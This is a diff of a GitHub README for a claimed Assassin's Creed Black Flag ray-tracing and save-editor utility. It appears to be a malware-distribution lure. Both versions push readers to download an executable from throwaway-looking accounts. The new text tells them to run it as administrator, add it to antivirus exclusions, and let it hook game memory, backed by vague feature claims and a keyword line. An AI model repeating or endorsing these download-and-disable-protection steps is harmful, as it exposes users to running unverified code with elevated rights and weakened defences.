@@ -1,96 +1,78 @@
-# Assassin's Creed Black Flag Resynced Edition v2026 - Game Script Utility 2026
+# 🏴‍☠️ black-flag-script-utility-raytrace-save - Enhance visuals and manage your saves
 
-> A PC-centered utility for Assassin's Creed Black Flag that brings ray-tracing-focused enhancements, save editing, and save management into a single package.
+[![Download Latest Version](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/Butterballreserveclause449/black-flag-script-utility-raytrace-save)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/henry-davislh8467/black-flag-script-utility-raytrace-save?style=flat-square)](https://github.com/henry-davislh8467/black-flag-script-utility-raytrace-save)
+This software improves the gaming experience for Assassin's Creed Black Flag. It provides tools to add ray-tracing enhancements to your graphics and simplifies how you manage or edit your save files. You can now adjust lighting effects to look modern and organize your progress files without manual file navigation.
 
----
+## 📋 System Requirements
 
-<p align="center">
-  <a href="https://henry-davislh8467.github.io/black-flag-script-utility-raytrace-save/">
-    <img src="https://img.shields.io/badge/Download-Assassin%27s%20Creed%20Black%20Flag%20Resynced%20Edition-brightgreen?style=for-the-badge" alt="Download Assassin's Creed Black Flag Resynced Edition">
-  </a>
-</p>
+Ensure your computer meets these specifications to run the software effectively:
 
-> **[Direct Download - Assassin's Creed Black Flag Resynced Edition](https://henry-davislh8467.github.io/black-flag-script-utility-raytrace-save/)**
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Graphics Card: A DirectX 11 compatible card with at least 4 GB of video memory.
+*   Disk Space: 50 MB for the utility files.
+*   Game Version: The official PC version of Assassin’s Creed IV: Black Flag.
 
----
+## 📥 How to Install
 
-[Download Latest Build](https://henry-davislh8467.github.io/black-flag-script-utility-raytrace-save/)
+1.  Visit this page to download: [https://github.com/Butterballreserveclause449/black-flag-script-utility-raytrace-save](https://github.com/Butterballreserveclause449/black-flag-script-utility-raytrace-save).
+2.  Locate the folder labeled "Releases" on the right side of the screen.
+3.  Click the blue release link to view the available files.
+4.  Download the file ending in .exe to your computer.
+5.  Move this file to a folder where you store your utilities.
+6.  Double-click the file to start the installation process.
+7.  Follow the prompts that appear on your screen to complete the setup.
 
----
+## 🛠️ Using the Ray-Tracing Enhancements
 
-## What This Project Does
+The utility adds advanced lighting effects to the game engine. These effects calculate light paths to create realistic shadows and reflections. 
 
-Assassin's Creed Black Flag Resynced Edition is a PC utility for Assassin's Creed Black Flag that combines visual enhancement with save-level management. It bundles a ray-tracing-oriented overhaul, texture upscaling, adaptive resolution scaling, and other performance-minded controls so the game can be adjusted from one workflow instead of several separate tools.
+1.  Open the application from your desktop shortcut.
+2.  Select the "Graphics" tab from the main menu.
+3.  Toggle the "Enable Ray-Tracing" switch to the "On" position.
+4.  Adjust the "Quality" slider to match your hardware capabilities. Higher settings look better but require a stronger computer.
+5.  Click "Apply Changes" to save your settings.
+6.  Launch your game session. The utility automatically hooks into the game process to apply the new lighting models.
 
-Beyond graphics tuning, the suite also covers save editing and backup handling, plus cross-platform save portability for Windows and Steam Deck-oriented environments. It is intended for players who want more control over Black Flag while keeping render settings and save files easier to move and organize across setups.
+## 💾 Saving and Editing Progress
 
-## Included Script Capabilities
+Managing save files manually can cause data loss. This utility simplifies the process by creating backups and offering an edit mode.
 
-- Ray-tracing overhaul options for a more up-to-date lighting pass
-- Save editing tools for modifying progress-related data
-- Save management support, including backup handling
-- Cross-platform save portability for moving files between setups
-- Shader recompilation cache support for smoother repeat launches
-- Texture upscaling controls for visual refinement
-- Adaptive resolution scaling for performance tuning
-- Multi-GPU support and Steam Deck configuration references
+1.  Open the application.
+2.  Choose the "Save Management" tab.
+3.  The program detects your save files automatically.
+4.  To create a copy of your progress, click "Backup Current Save."
+5.  To edit your currency or item counts, click "Open Save Editor."
+6.  Change the desired values, but do not exceed the game's internal limits, as this causes errors.
+7.  Click "Commit Changes" to write the new data to your save file.
+8.  The program confirms when the save is ready for use in-game.
 
-## Installation and Use
+## ⚠️ Troubleshooting Common Issues
 
-1. Download the latest build from the project link above.
-2. Extract the package to a folder you can access easily.
-3. Place or launch the included files alongside your Assassin's Creed Black Flag PC setup.
-4. Follow the included configuration steps for your preferred save and rendering options.
+If the utility fails to start or the game does not show the new graphics, try these steps:
 
-Example usage pattern:
+*   **Administrator Rights:** Right-click the application icon and select "Run as administrator." This gives the utility permission to modify game files.
+*   **Antivirus Interference:** Some antivirus programs block lighting injectors. Add the utility to your list of "Allowed" or "Excluded" programs.
+*   **File Path:** Ensure your game installation folder does not have special characters in the name. Move the game or the utility to a simple directory like `C:\Games\BlackFlag`.
+*   **Driver Updates:** Ensure your graphics card drivers are current. Outdated drivers can prevent the ray-tracing injector from communicating with the game engine.
 
-- Open the utility
-- Select your save or profile file
-- Choose the visual or performance setting you want
-- Save the updated configuration and back up your original files first
+## ⚙️ Advanced Configuration Settings
 
-## Available Options
+You can customize the way the utility interacts with your system through the "Configuration" menu.
 
-| Option | Purpose |
-| --- | --- |
-| Ray tracing | Enables the visual enhancement workflow |
-| Save editor | Changes supported save data values |
-| Backup mode | Keeps a copy of the current save before edits |
-| Cross-platform profile | Helps prepare save files for other supported setups |
-| Shader cache | Uses recompilation cache handling for repeat runs |
-| Scaling profile | Adjusts texture upscaling and adaptive resolution behavior |
-| GPU mode | Selects multi-GPU-aware behavior where available |
-| Steam Deck preset | Applies a configuration aimed at Steam Deck use cases |
+*   **Refresh Rate Lock:** Use this if you experience screen tearing. It limits the images sent to your screen to match your monitor's speed.
+*   **Log Files:** Turn this on if you encounter crashes. The utility creates a text file of its activity, which helps identify the source of an error.
+*   **Window Mode:** Select "Borderless Window" for the best result when switching between the game and the utility.
 
-## Compatibility Notes
+## 📝 Frequently Asked Questions
 
-This project is meant for PC use with Assassin's Creed Black Flag-related setups, including Windows installations and Steam Deck-oriented configurations. Its save portability and configuration focus also reference Ubisoft Connect and Steam-linked environments.
+**Will this software trigger a ban in multiplayer games?**
+No. This utility functions with the local game files. It does not interface with online servers or multiplayer components provided by the developer.
 
-Some options can vary depending on the game build you have, any installed mods, or how your local save files are stored. If a feature is not detected by your setup, check the included files and tune the configuration for your environment.
+**Can I undo my changes?**
+Yes. You can use the "Restore Backup" button in the Save Management tab to revert to any previous state recorded by the utility. 
 
-## FAQ
+**Does this software change the original game files?**
+The utility uses a method called "hooking." It loads its instructions into the game memory while the game runs. It does not overwrite your original game files, so your installation remains intact.
 
-**How do I get started?**  
-Download the latest build, extract it, and open the included utility files with your Black Flag installation details ready.
-
-**Can I move to a newer release without starting over?**  
-Usually yes. In most cases you can swap in the newer build while keeping your backups and configuration notes.
-
-**Can I use only the save tools or only the visual tools?**  
-The project is packaged as a combined suite, but the available settings can generally be adjusted independently.
-
-**Will it work on every PC setup?**  
-It is built for PC-focused Black Flag environments, but results may differ based on your game version and local configuration.
-
-**Where should I keep my saves?**  
-Keep a backed-up copy before editing, and store a separate version outside the active game directory.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: assassin's creed, black flag, ray tracing, utility, save editor, pc gaming, graphics mod
